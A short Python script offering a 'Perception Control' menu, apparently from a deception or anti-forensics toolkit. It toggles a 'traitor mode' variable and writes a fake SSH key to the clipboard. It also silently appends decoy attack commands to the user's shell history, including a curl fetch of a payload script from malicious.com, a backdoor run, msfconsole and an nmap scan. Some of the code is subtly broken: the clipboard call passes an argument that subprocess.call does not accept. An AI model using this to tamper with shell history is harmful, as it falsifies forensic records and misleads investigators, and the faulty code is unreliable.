import subprocess
import os

def toggle_traitor_mode():
    mode = os.environ.get("LUNE_MODE", "real")
    if mode == "fake":
        os.environ["LUNE_MODE"] = "real"
    else:
        os.environ["LUNE_MODE"] = "fake"
    subprocess.call(["python3", "modules/deception/traitor_mode.py"])

def fake_clipboard():
    subprocess.call(["xclip", "-selection", "clipboard"], input=b"ssh-rsa AAAFAKEKEY12345678\n")

def poison_shell_history():
    hist_path = os.path.expanduser("~/.bash_history")
    junk = [
        "curl http://malicious.com/payload.sh",
        "python3 backdoor.py",
        "msfconsole",
        "nmap -sS -T5 internal"
    ]
    with open(hist_path, "a") as f:
        for line in junk:
            f.write(f"{line}\n")
    print("[+] Shell history polluted.")

def main():
    print("╭────────────────────────────╮")
    print("│     Perception Control     │")
    print("╰────────────────────────────╯")
    print("[1] Toggle Traitor Mode")
    print("[2] Inject Clipboard Payload")
    print("[3] Poison Shell History")
    print("[4] Exit")
    choice = input("Select: ").strip()
    if choice == "1":
        toggle_traitor_mode()
    elif choice == "2":
        fake_clipboard()
    elif choice == "3":
        poison_shell_history()
    else:
        print("Bye.")

if __name__ == "__main__":
    main()
